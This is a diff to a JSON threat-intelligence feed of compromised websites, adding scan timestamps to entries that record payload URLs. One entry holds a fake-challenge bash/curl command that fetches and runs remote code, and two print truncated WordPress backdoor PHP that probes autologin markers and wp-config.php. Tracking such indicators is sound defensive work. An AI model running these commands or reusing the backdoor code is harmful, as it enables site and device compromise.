@@ -16,7 +16,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcrvtyw0de90omlmvvbxosz"
+    "ReportId": "cmwcrvtyw0de90omlmvvbxosz",
+    "ScannedAt": "2026-11-11T23:51:13.535000+00:00"
   },
   {
     "UrlDomain": "kathakkendraindia.com",
@@ -35,7 +36,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcrqyux0dcx0omlxynjl1v9"
+    "ReportId": "cmwcrqyux0dcx0omlxynjl1v9",
+    "ScannedAt": "2026-11-11T23:47:26.649000+00:00"
   },
   {
     "UrlDomain": "andreapapst.com",
@@ -49,7 +51,8 @@
     "Related": [],
     "Payload": "$tok='w12RZCGUfbGwNtu-O5H-263-W-9YfmOgTIMX2C3GEmw';$id='6cc5363fc43fc247';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwcrq4tf0d9w0omlc3dtk07l"
+    "ReportId": "cmwcrq4tf0d9w0omlc3dtk07l",
+    "ScannedAt": "2026-11-11T23:46:47.689000+00:00"
   },
   {
     "UrlDomain": "onestopconsulting.au",
@@ -67,7 +70,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwcrpt0v0d8q0omleewsbsdg"
+    "ReportId": "cmwcrpt0v0d8q0omleewsbsdg",
+    "ScannedAt": "2026-11-11T23:46:32.397000+00:00"
   },
   {
     "UrlDomain": "aivensconsulting.lu",
@@ -81,7 +85,8 @@
     "Related": [],
     "Payload": "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '8jewg3sn[.]evine[.]store/?ublib=ef0ccd03-e149-48b1-8b9a-25a494a78424')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwcresks0cyc0oml2imzr62e"
+    "ReportId": "cmwcresks0cyc0oml2imzr62e",
+    "ScannedAt": "2026-11-11T23:37:58.630000+00:00"
   },
   {
     "UrlDomain": "www.243news.net",
@@ -100,7 +105,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr7lcj0cwa0omljnldfl9a"
+    "ReportId": "cmwcr7lcj0cwa0omljnldfl9a",
+    "ScannedAt": "2026-11-11T23:32:22.674000+00:00"
   },
   {
     "UrlDomain": "bambuzen.com.br",
@@ -119,7 +125,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr4pi30cvb0omlafa4q2sj"
+    "ReportId": "cmwcr4pi30cvb0omlafa4q2sj",
+    "ScannedAt": "2026-11-11T23:30:08.063000+00:00"
   },
   {
     "UrlDomain": "www.agroindustriaadl.com",
@@ -138,7 +145,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr4nve0cuk0oml1wrphqew"
+    "ReportId": "cmwcr4nve0cuk0oml1wrphqew",
+    "ScannedAt": "2026-11-11T23:30:05.964000+00:00"
   },
   {
     "UrlDomain": "askmerating.com",
@@ -157,7 +165,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr3mrb0ctj0omlc6zr15v3"
+    "ReportId": "cmwcr3mrb0ctj0omlc6zr15v3",
+    "ScannedAt": "2026-11-11T23:29:17.847000+00:00"
   },
   {
     "UrlDomain": "americanwatchmen.com",
@@ -176,7 +185,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr2sq20csf0omlvnp6wv50"
+    "ReportId": "cmwcr2sq20csf0omlvnp6wv50",
+    "ScannedAt": "2026-11-11T23:28:38.898000+00:00"
   },
   {
     "UrlDomain": "bartoszjagielski.pl",
@@ -195,7 +205,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr1ted0cqz0omlue5bltle"
+    "ReportId": "cmwcr1ted0cqz0omlue5bltle",
+    "ScannedAt": "2026-11-11T23:27:53.146000+00:00"
   },
   {
     "UrlDomain": "automatenthoennes.de",
@@ -216,7 +227,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr1gun0cpy0omlji8pb0fr"
+    "ReportId": "cmwcr1gun0cpy0omlji8pb0fr",
+    "ScannedAt": "2026-11-11T23:27:36.783000+00:00"
   },
   {
     "UrlDomain": "www.barbaralibertine.fr",
@@ -235,7 +247,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcr0vu30coq0omlg8nbe3mm"
+    "ReportId": "cmwcr0vu30coq0omlg8nbe3mm",
+    "ScannedAt": "2026-11-11T23:27:09.591000+00:00"
   },
   {
     "UrlDomain": "2c-sociale.fr",
@@ -254,7 +267,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqy42h0cnd0oml7vxqns0w"
+    "ReportId": "cmwcqy42h0cnd0oml7vxqns0w",
+    "ScannedAt": "2026-11-11T23:25:00.347000+00:00"
   },
   {
     "UrlDomain": "adelaar.in",
@@ -273,7 +287,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqeu820c9v0omlw6zgdk5n"
+    "ReportId": "cmwcqeu820c9v0omlw6zgdk5n",
+    "ScannedAt": "2026-11-11T23:10:01.071000+00:00"
   },
   {
     "UrlDomain": "aw-cal.com",
@@ -292,7 +307,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqe2w80c930omls75pwevp"
+    "ReportId": "cmwcqe2w80c930omls75pwevp",
+    "ScannedAt": "2026-11-11T23:09:25.375000+00:00"
   },
   {
     "UrlDomain": "alquileresagriga.com",
@@ -311,7 +327,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqdn190c810omlivnixut7"
+    "ReportId": "cmwcqdn190c810omlivnixut7",
+    "ScannedAt": "2026-11-11T23:09:05.181000+00:00"
   },
   {
     "UrlDomain": "bars-kzn.ru",
@@ -330,7 +347,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqd9y80c7c0oml39fz6i6c"
+    "ReportId": "cmwcqd9y80c7c0oml39fz6i6c",
+    "ScannedAt": "2026-11-11T23:08:48.186000+00:00"
   },
   {
     "UrlDomain": "acnplastic.com",
@@ -349,7 +367,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqaq5l0c570omlcug1lcmi"
+    "ReportId": "cmwcqaq5l0c570omlcug1lcmi",
+    "ScannedAt": "2026-11-11T23:06:49.248000+00:00"
   },
   {
     "UrlDomain": "awilli.co.uk",
@@ -368,7 +387,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcqagtk0c4n0omldm3v34fw"
+    "ReportId": "cmwcqagtk0c4n0omldm3v34fw",
+    "ScannedAt": "2026-11-11T23:06:37.145000+00:00"
   },
   {
     "UrlDomain": "benbacriverside.com",
@@ -392,7 +412,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwcq9cnn0c1l0omlfc0yrkd9"
+    "ReportId": "cmwcq9cnn0c1l0omlfc0yrkd9",
+    "ScannedAt": "2026-11-11T23:05:45.104000+00:00"
   },
   {
     "UrlDomain": "24hr.co.il",
@@ -410,7 +431,8 @@
     "ResolvedDownloadUrl": [
       "http://softsyncizobrazie.net/x"
     ],
-    "ReportId": "cmwclwpgw0a210omltnipi6za"
+    "ReportId": "cmwclwpgw0a210omltnipi6za",
+    "ScannedAt": "2026-11-11T21:03:56.705000+00:00"
   },
   {
     "UrlDomain": "hublerfotoceramica.com.br",
@@ -429,7 +451,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwcf8b7j07s00omljo01l4y5"
+    "ReportId": "cmwcf8b7j07s00omljo01l4y5",
+    "ScannedAt": "2026-11-11T17:57:00.720000+00:00"
   },
   {
     "UrlDomain": "mespo.net",
@@ -447,7 +470,8 @@
     "ResolvedDownloadUrl": [
       "https://swingerwives.com"
     ],
-    "ReportId": "cmwcf73lu07rj0omlahvm476x"
+    "ReportId": "cmwcf73lu07rj0omlahvm476x",
+    "ScannedAt": "2026-11-11T17:56:04.253000+00:00"
   },
   {
     "UrlDomain": "elegantinteriors.com.pk",
@@ -472,7 +496,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwcd2vl707b60omlre2bbg8k"
+    "ReportId": "cmwcd2vl707b60omlre2bbg8k",
+    "ScannedAt": "2026-11-11T16:56:48.024000+00:00"
   },
   {
     "UrlDomain": "bivashindustries.com",
@@ -491,7 +516,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwccy95x079g0omlvd2ccsb6"
+    "ReportId": "cmwccy95x079g0omlvd2ccsb6",
+    "ScannedAt": "2026-11-11T16:53:12.343000+00:00"
   },
   {
     "UrlDomain": "condogo.com.br",
@@ -514,7 +540,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwccx3dt078o0omlivx66n50"
+    "ReportId": "cmwccx3dt078o0omlivx66n50",
+    "ScannedAt": "2026-11-11T16:52:18.178000+00:00"
   },
   {
     "UrlDomain": "sevox.net",
@@ -533,7 +560,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcc66iw07310omlt924pkt8"
+    "ReportId": "cmwcc66iw07310omlt924pkt8",
+    "ScannedAt": "2026-11-11T16:31:22.552000+00:00"
   },
   {
     "UrlDomain": "hydebuild.com.au",
@@ -552,7 +580,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcc4tsn071c0omltwru33xb"
+    "ReportId": "cmwcc4tsn071c0omltwru33xb",
+    "ScannedAt": "2026-11-11T16:30:19.360000+00:00"
   },
   {
     "UrlDomain": "bgrsportzz.com",
@@ -571,7 +600,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcbl5u006vv0omlb42loz7x"
+    "ReportId": "cmwcbl5u006vv0omlb42loz7x",
+    "ScannedAt": "2026-11-11T16:15:01.776000+00:00"
   },
   {
     "UrlDomain": "brightedu.vn",
@@ -606,7 +636,8 @@
       "https://content-collector.com/dYjJs2gGewlXGMKe",
       "https://js-staticdelivery.com"
     ],
-    "ReportId": "cmwcbb1wp06p00omllkagp0ih"
+    "ReportId": "cmwcbb1wp06p00omllkagp0ih",
+    "ScannedAt": "2026-11-11T16:07:10.237000+00:00"
   },
   {
     "UrlDomain": "therapie-in-chemnitz.de",
@@ -625,7 +656,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcaz8yj06i20omltq3gtf6h"
+    "ReportId": "cmwcaz8yj06i20omltq3gtf6h",
+    "ScannedAt": "2026-11-11T15:57:59.519000+00:00"
   },
   {
     "UrlDomain": "kihdma.com",
@@ -644,7 +676,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwcaflcb069j0omlaoubq6f8"
+    "ReportId": "cmwcaflcb069j0omlaoubq6f8",
+    "ScannedAt": "2026-11-11T15:42:42.398000+00:00"
   },
   {
     "UrlDomain": "www.aslolmpc-sys.my.id",
@@ -667,7 +700,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/8cb0-4007-b828-39ac22d5c847/-/raw/main/90e5-be84fa8e3613"
     ],
-    "ReportId": "cmwcae70a068n0omlkip0wlqq"
+    "ReportId": "cmwcae70a068n0omlkip0wlqq",
+    "ScannedAt": "2026-11-11T15:41:37.171000+00:00"
   },
   {
     "UrlDomain": "www.calawdocs.com",
@@ -685,7 +719,8 @@
     "ResolvedDownloadUrl": [
       "https://content-collector.com/4MRhuy1FNnrumSHZ"
     ],
-    "ReportId": "cmwcaacd0067j0oml4ziu910p"
+    "ReportId": "cmwcaacd0067j0oml4ziu910p",
+    "ScannedAt": "2026-11-11T15:38:37.512000+00:00"
   },
   {
     "UrlDomain": "shebhaproduct.com",
@@ -710,7 +745,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/e0f433c5355ab6b9"
     ],
-    "ReportId": "cmwca5h1o061v0omlwaufjf39"
+    "ReportId": "cmwca5h1o061v0omlwaufjf39",
+    "ScannedAt": "2026-11-11T15:34:50.263000+00:00"
   },
   {
     "UrlDomain": "www.prolocomedicina.it",
@@ -732,7 +768,8 @@
     "ResolvedDownloadUrl": [
       "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
     ],
-    "ReportId": "cmwc8h8ly05p60omloemc6t0j"
+    "ReportId": "cmwc8h8ly05p60omloemc6t0j",
+    "ScannedAt": "2026-11-11T14:47:59.979000+00:00"
   },
   {
     "UrlDomain": "company-hamza-abbs.com",
@@ -756,7 +793,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc8ghte05n20omlrpl5slpy"
+    "ReportId": "cmwc8ghte05n20omlrpl5slpy",
+    "ScannedAt": "2026-11-11T14:47:25.243000+00:00"
   },
   {
     "UrlDomain": "qualitylanguage.com.br",
@@ -777,7 +815,8 @@
     "ResolvedDownloadUrl": [
       "https://copiose.org/lom/62a9405c9735a1a7"
     ],
-    "ReportId": "cmwc8571t05i70omlhp2zg2vc"
+    "ReportId": "cmwc8571t05i70omlhp2zg2vc",
+    "ScannedAt": "2026-11-11T14:38:38.104000+00:00"
   },
   {
     "UrlDomain": "www.balancedarch.ca",
@@ -802,7 +841,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc3x5a204lg0omlb2wqsuby"
+    "ReportId": "cmwc3x5a204lg0omlb2wqsuby",
+    "ScannedAt": "2026-11-11T12:40:24.105000+00:00"
   },
   {
     "UrlDomain": "bienestarozempic.com",
@@ -826,7 +866,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc3urxe04kd0omlim6ckocw"
+    "ReportId": "cmwc3urxe04kd0omlim6ckocw",
+    "ScannedAt": "2026-11-11T12:38:33.514000+00:00"
   },
   {
     "UrlDomain": "bluehumanitiesarchive.com",
@@ -845,7 +886,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc3roqe04jd0oml9slcvv9s"
+    "ReportId": "cmwc3roqe04jd0oml9slcvv9s",
+    "ScannedAt": "2026-11-11T12:36:09.356000+00:00"
   },
   {
     "UrlDomain": "cgisolar.com",
@@ -864,7 +906,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc38eum04fx0oml79xqldg5"
+    "ReportId": "cmwc38eum04fx0oml79xqldg5",
+    "ScannedAt": "2026-11-11T12:21:09.999000+00:00"
   },
   {
     "UrlDomain": "www.bifolkal.org",
@@ -883,7 +926,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc33x7q04db0oml6ga4o98q"
+    "ReportId": "cmwc33x7q04db0oml6ga4o98q",
+    "ScannedAt": "2026-11-11T12:17:40.644000+00:00"
   },
   {
     "UrlDomain": "www.bendigowellnesscentre.com.au",
@@ -902,7 +946,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc2s9eu047r0omld9cwe9ei"
+    "ReportId": "cmwc2s9eu047r0omld9cwe9ei",
+    "ScannedAt": "2026-11-11T12:08:36.546000+00:00"
   },
   {
     "UrlDomain": "bestmemory.com.br",
@@ -921,7 +966,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc2pp0e045j0oml6vpy7f7g"
+    "ReportId": "cmwc2pp0e045j0oml6vpy7f7g",
+    "ScannedAt": "2026-11-11T12:06:36.733000+00:00"
   },
   {
     "UrlDomain": "b2service.com.br",
@@ -935,7 +981,8 @@
     "Related": [],
     "Payload": "$tok='Dg0mOZXbRsMbRnIM8aXPYlO_1EaBUtucs7yEA9bacyM';$id='c9fe0201b094be2a';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwc2pdk2044a0omlbicfkxvn"
+    "ReportId": "cmwc2pdk2044a0omlbicfkxvn",
+    "ScannedAt": "2026-11-11T12:06:21.819000+00:00"
   },
   {
     "UrlDomain": "www.amazon-lieferung.ch",
@@ -954,7 +1001,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc2oi1c04390omlaoemt1cq"
+    "ReportId": "cmwc2oi1c04390omlaoemt1cq",
+    "ScannedAt": "2026-11-11T12:05:41.117000+00:00"
   },
   {
     "UrlDomain": "amplifiedstrings.com",
@@ -978,7 +1026,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc2oa6f042g0omlyp6s24eo"
+    "ReportId": "cmwc2oa6f042g0omlyp6s24eo",
+    "ScannedAt": "2026-11-11T12:05:30.932000+00:00"
   },
   {
     "UrlDomain": "bufanfactory.com",
@@ -1011,7 +1060,8 @@
     "ResolvedDownloadUrl": [
       "https://apidatalive.com/k/m255fDhVEvxs4mO9/collect?t=item&ti=4wpwLosTMSRrYNN4oQeDyIpm"
     ],
-    "ReportId": "cmwc2nik9041h0omldfh5zlsu"
+    "ReportId": "cmwc2nik9041h0omldfh5zlsu",
+    "ScannedAt": "2026-11-11T12:04:55.126000+00:00"
   },
   {
     "UrlDomain": "collagenglowc.com",
@@ -1035,7 +1085,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc2l882040h0omlxbkj9ffw"
+    "ReportId": "cmwc2l882040h0omlxbkj9ffw",
+    "ScannedAt": "2026-11-11T12:03:08.416000+00:00"
   },
   {
     "UrlDomain": "armankaymakcian.com",
@@ -1054,7 +1105,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc2k3l103z10oml9d342v9t"
+    "ReportId": "cmwc2k3l103z10oml9d342v9t",
+    "ScannedAt": "2026-11-11T12:02:15.706000+00:00"
   },
   {
     "UrlDomain": "alkhaleej-shopping.com",
@@ -1078,7 +1130,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc2i1nf03y30oml2lrh8mr8"
+    "ReportId": "cmwc2i1nf03y30oml2lrh8mr8",
+    "ScannedAt": "2026-11-11T12:00:39.974000+00:00"
   },
   {
     "UrlDomain": "alphakidsgym.com",
@@ -1097,7 +1150,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc25uc203u90oml4r2yq3pr"
+    "ReportId": "cmwc25uc203u90oml4r2yq3pr",
+    "ScannedAt": "2026-11-11T11:51:10.513000+00:00"
   },
   {
     "UrlDomain": "andrewscott.co.za",
@@ -1116,7 +1170,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc24q4u03t30oml0sqywzuc"
+    "ReportId": "cmwc24q4u03t30oml0sqywzuc",
+    "ScannedAt": "2026-11-11T11:50:18.430000+00:00"
   },
   {
     "UrlDomain": "bharquitetura.com.br",
@@ -1141,7 +1196,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwc23hcx03s30omll1gu2llr"
+    "ReportId": "cmwc23hcx03s30omll1gu2llr",
+    "ScannedAt": "2026-11-11T11:49:19.783000+00:00"
   },
   {
     "UrlDomain": "banhxedayhang.com",
@@ -1160,7 +1216,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc1vk1j03p50omlirr9e7hs"
+    "ReportId": "cmwc1vk1j03p50omlirr9e7hs",
+    "ScannedAt": "2026-11-11T11:43:10.647000+00:00"
   },
   {
     "UrlDomain": "www.baffettiscale.it",
@@ -1179,7 +1236,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc1tydx03nk0omlbn9ei5yt"
+    "ReportId": "cmwc1tydx03nk0omlbn9ei5yt",
+    "ScannedAt": "2026-11-11T11:41:55.939000+00:00"
   },
   {
     "UrlDomain": "batoolsisters.org",
@@ -1198,7 +1256,8 @@
     "ResolvedDownloadUrl": [
